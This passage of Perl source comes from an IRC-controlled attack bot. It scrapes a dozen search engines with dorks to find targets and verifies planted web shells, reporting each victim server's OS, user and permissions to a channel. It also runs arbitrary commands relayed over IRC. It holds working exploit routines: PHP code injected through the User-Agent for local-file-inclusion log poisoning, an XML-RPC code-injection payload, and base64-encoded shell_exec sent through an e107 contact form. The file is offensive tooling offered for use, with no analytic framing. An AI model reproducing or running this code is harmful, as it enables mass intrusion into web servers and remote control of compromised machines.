   my @list;
   my $key = $_[0];
   for($b=1;$b<=1000;$b+=100){
      my $Th=("http://www.lookle.com/search/index.php?page=search/web&search=".key($key)."&type=web&startpage=".$b);
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link=$1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
         }
      }
   return @list;
}
sub optuszoo(){
   my @list;
   my $key = $_[0];
   for($b=10;$b<=1000;$b+=100){
      my $Th=("http://www.optuszoo.com.au/search?q=".key($key)."&start=".$b."&target=web");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
         }
      }
   return @list;
}
sub search66(){
   my @list;
   my $key = $_[0];
   for($b=10;$b<=1000;$b+=100){
      my $Th=("http://search.search66.com/?query=".key($key)."&start=".$b."&offset=20&lang=ENG");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
         }
      }
   return @list;
}
sub arrama(){
   my @list;
   my $key = $_[0];
   for($b=10;$b<=1000;$b+=100){
      my $Th=("http://www.arrama.com/arama.html?cx=partner-pub-8986600646077390%3A3up8c9-e187&cof=FORID%3A10&ie=UTF-8&q=".key($key)."&sa=Web'de+Ara-Bul&siteurl=www.arrama.com%2F#8".$b."");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
      }
   }
return @list;
}
sub excitejp(){
   my @list;
   my $key = $_[0];
   for($b=10;$b<=1000;$b+=100){
      my $Th=("http://www.excite.co.jp/search.gw?target=combined&look=excite_jp&Language=&sstype=excite_r&search=".key($key)."&FirstResult=".$b."");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
      }
   }
return @list;
}
sub biglobe(){
   my @list;
   my $key = $_[0];
   for($b=10;$b<=1000;$b+=100){
      my $Th=("http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=25&q=".key($key)."&lr=all");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
      }
   }
return @list;
}   
sub clix(){
   my @list;
   my $key = $_[0];
   for($b=1;$b<=1000;$b+=100){
      my $Th=("http://pesquisa.clix.pt/resultado.html?question=".key($key)."&in=Mundial&num=25&ckWhere=Mundo&position=".$b."");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
      }
   }
return @list;
}
sub searchch(){
   my @list;
   my $key = $_[0];
   for($b=10;$b<=1000;$b+=100){
      my $Th=("http://web.search.ch/?rank=".$b."&q=".key($key)."");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
      }
   }
return @list;
}
sub cada(){
   my @list;
   my $key = $_[0];
   for($b=10;$b<=1000;$b+=100){
      my $Th=("http://cade.search.yahoo.com/search;_ylt=A0geu8ny1rRO8gQADw7b7Qt.?p=".key($key)."&fr=sfp&xargs=0&pstart=1&b=".$b);
      my $Res=&search_engine_query($Th);
      while($Res =~ m/<a href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
         }
      }
   return @list;
}

#########################################
sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}
sub htmltourl { my $str = $_[0]; $str =~ s/&amp;/&/g; return $str; }
sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/\?/\%3F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
   $dork =~ s/@/\%40/g;
   $dork =~ s/\[/\%5B/g;
   $dork =~ s/\]/\%5D/g;
   $dork =~ s/\?/\%3F/g;
   $dork =~ s/\=/\%3D/g;
   $dork =~ s/\|/\%7C/g;
    return $dork;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/$1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$link,$host,$hdir);
    return @list;
}

sub search_engine_query($) {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ($query eq "") { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
            my @pages = <$sock>;
            $page = "@pages";
            close($sock);
        };
    return $page;
}

##[ INFO OS ]##
sub info_main {
  my ($url,$chan,$engine,$logo) = @_;
  my $safemode;
 
my @inff = ("2","3","5","8","11","12"); # info
$infoc = $inff[rand(scalar(@inff))]; my $inc = $infoc;

my @inft = ("7","6","10","13","14","15"); # info txt
$inftc = $inft[rand(scalar(@inft))]; my $inf = $inftc;
 
   my $check = &get_content($url);sleep(3);
   if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {
      my $safe =""; my $os ="";my $uname ="";my $server ="";my $user ="";my $uid ="";my $dir ="";my $perm ="";my $hdd ="";my $disfunc ="";
      if ($check =~ m/<font face='verdana' size='2'><b>SAFE:<\/b> (.+?)<\/font><br>/g ) { $safe = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>OS:<\/b> (.+?)<\/font><br>/g ) { $os = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>UNAME:<\/b> (.+?)<\/font><br>/g ) { $uname = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>SERVER:<\/b> (.+?)<\/font><br>/g ) { $server = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>USER:<\/b> (.+?)<\/font><br>/g ) { $user = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>UID:<\/b> (.+?)<\/font><br>/g ) { $uid = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>DIR:<\/b> (.+?)<\/font><br>/g ) { $dir = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>PERM:<\/b> (.+?)<\/font><br>/g ) { $perm = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>HDD:<\/b> (.+?)<\/font><br>/g ) { $hdd = $1; }
      if ($check =~ m/<font face='verdana' size='2'><b>DISFUNC:<\/b> (.+?)<\/font><br>/g ) { $disfunc = $1; }
      if ($safe =~ /OFF/) { $safemode = "9OFF (Not Secure)"; } elsif ($safe =~ /ON/) { $safemode ="4ON (Secure)"; } else { $safemode ="1-"; }
      if ($disfunc) { $disfunc = "12(4@".$inc."Disfunc12)".$inf." $disfunc "; } else { $disfunc = ""; }
      if ($perm =~/W/) { $perm = "$perm"; } else { $perm = "$perm"; }
         &msg("$chan","$logo12(4@0$engine12)(4@8SHELL12)13 ".$url." 12(4@8safemode12) ".$safemode." 12(4@8OS12)13 ".$os." ");
         if ($conf{shchan} == 1) {
      
            &msg("$shchn","12(4@".$inc."SHELL12)".$inf." ".$url." 12(4@".$inc."safemode12) ".$safemode." 12(4@".$inc."OS12)".$inf." ".$os." ");
            &msg("$shchn","12(4@".$inc."Uname12)".$inf." ".$uname." 12(4@".$inc."User12)".$inf." ".$user." ".$inc."/".$inf." ".$uid." 12(4@".$inc."Server12)".$inf." ".$server." ");
            &msg("$shchn","12(4@".$inc."Dir12)".$inf." ".$dir." ".$perm." 12(4@".$inc."HDD12)".$inf." ".$hdd." ".$disfunc." ");sleep(2);

         }
   }
}

#########################################
sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 2; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url  = $_[0];
my $cmd  = $_[1];
my $chan = $_[2];
my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(7);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
&msg("$chan","0,1(0LFI0)4 $1 ");
} else {
&msg("$chan","0,1(0LFI0)4 No Output ");
}
}

sub cmdxml() {
my $jed  = $_[0];
my $dwa  = $_[1];
my $chan = $_[2];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'bamby';system('".$dwa."');echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
&msg("$chan","0,1(0XML0)4 $1 ");
} else {
&msg("$chan","0,1(0XML0)4 No Output ");
}
}

sub cmde107() {
my $path  = $_[0];
my $code = $_[1];
my $chan  = $_[2];
my $codecmd = encode_base64($code);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"));';
    my $req = HTTP::Request->new(POST => $path);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
     $mydata = $1;
&msg("$chan","0,1(0E1070)4 $mydata ");
}
else { &msg("$chan","0,1(0E1070)4 No Output "); }
}
